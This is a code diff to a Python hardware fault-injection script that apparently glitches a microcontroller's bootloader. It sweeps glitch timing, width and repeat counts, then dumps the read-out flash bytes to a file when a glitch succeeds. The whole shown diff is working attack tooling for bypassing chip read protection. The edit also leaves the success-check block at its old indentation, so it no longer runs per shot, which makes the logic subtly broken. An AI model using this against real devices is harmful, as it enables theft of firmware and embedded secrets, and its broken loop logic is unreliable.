@@ -36,7 +36,7 @@ ADDR = 0x08008000
 ADDR_CKS = 0x08 ^ 0x00 ^ 0x80 ^ 0x00          # 0x88
 NBYTES = 256
 
-WIDTH   = int(os.environ.get('G_WIDTH', 40))
+WIDTHS  = [int(x) for x in os.environ.get('G_WIDTH', '40').split(',')]
 OFFSET  = int(os.environ.get('G_OFFSET', -45))
 CLKGEN  = float(os.environ.get('G_CLKGEN', 4e6))   # 4MHz: 49.8% = 124ns pulses
 REPEATS = [int(x) for x in os.environ.get('G_REPEATS', '10,25,40,49').split(',')]
@@ -264,7 +264,7 @@ def main():
     if not boot_and_sync(fast=False):
         teardown(); sys.exit('no sync to start')
     print(f'[+] synced. sweep ext {EXT_MIN}-{EXT_MAX} step {STEP} '
-          f'width {WIDTH} offset {OFFSET} repeats {REPEATS}')
+          f'widths {WIDTHS} offset {OFFSET} repeats {REPEATS}')
     threading.Thread(target=_watchdog, daemon=True).start()
 
     log_path = f'glitch2_{datetime.now():%Y%m%d_%H%M%S}.csv'
@@ -275,28 +275,29 @@ def main():
     shot = 0
     t0 = time.time()
     for ext in range(EXT_MIN, EXT_MAX + 1, STEP):
-        for repeat in REPEATS:
-            for _sample in range(SAMPLES):
-                # rig-drop recovery: any USB/CW/serial exception during a
-                # shot -> rebuild the session, RESUME at the same point.
-                try:
-                    _kick()
-                    verdict, payload, note = attempt(ext, WIDTH, repeat)
-                except Exception as e:
-                    print(f'  [rig-drop] {type(e).__name__} at '
-                          f'ext={ext * 1e6 / CLKGEN:.1f}us rep={repeat} '
-                          f'-> reconnect', flush=True)
-                    if not reconnect():
-                        teardown(); sys.exit(f'rig lost after rig-drop: {e}')
-                    continue          # same grid point, next stochastic roll
-                shot += 1
-                logw.writerow([shot, ext, round(ext * 1e6 / CLKGEN, 2),
-                               WIDTH, repeat, verdict, note])
+        for width in WIDTHS:
+            for repeat in REPEATS:
+                for _sample in range(SAMPLES):
+                    # rig-drop recovery: any USB/CW/serial exception during a
+                    # shot -> rebuild the session, RESUME at the same point.
+                    try:
+                        _kick()
+                        verdict, payload, note = attempt(ext, width, repeat)
+                    except Exception as e:
+                        print(f'  [rig-drop] {type(e).__name__} at '
+                              f'ext={ext * 1e6 / CLKGEN:.1f}us rep={repeat} '
+                              f'-> reconnect', flush=True)
+                        if not reconnect():
+                            teardown(); sys.exit(f'rig lost after rig-drop: {e}')
+                        continue          # same grid point, next stochastic roll
+                    shot += 1
+                    logw.writerow([shot, ext, round(ext * 1e6 / CLKGEN, 2),
+                                   width, repeat, verdict, note])
                 if verdict == 'SUCCESS':
                     out = f'JACKPOT_{datetime.now():%H%M%S}.bin'
                     open(out, 'wb').write(payload)
                     print(f'\n[***] GLITCH-2 SUCCESS  ext={ext} '
-                          f'({ext * 1e6 / CLKGEN:.1f}us) width={WIDTH} '
+                          f'({ext * 1e6 / CLKGEN:.1f}us) width={width} '
                           f'repeat={repeat}')
                     print(f'      dumped {len(payload)} B -> {out}')
                     print(f'      first16: {payload[:16].hex()}')
